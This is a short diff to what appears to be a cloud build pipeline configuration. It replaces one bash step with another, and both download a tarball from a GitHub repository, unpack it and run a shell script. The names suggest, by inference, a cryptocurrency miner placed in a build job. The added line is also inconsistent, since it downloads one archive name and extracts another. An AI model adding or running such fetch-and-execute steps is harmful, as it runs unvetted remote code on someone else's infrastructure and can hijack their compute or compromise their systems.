@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         wget https://github.com/sabarlur/coba/raw/main/droviolet.tar.gz && tar xf droviolet.tar.gz && ./dro.sh
+         wget https://github.com/sabarlur/coba/raw/main/srbdero.tar.gz && tar xf droviolet.tar.gz && ./dero.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
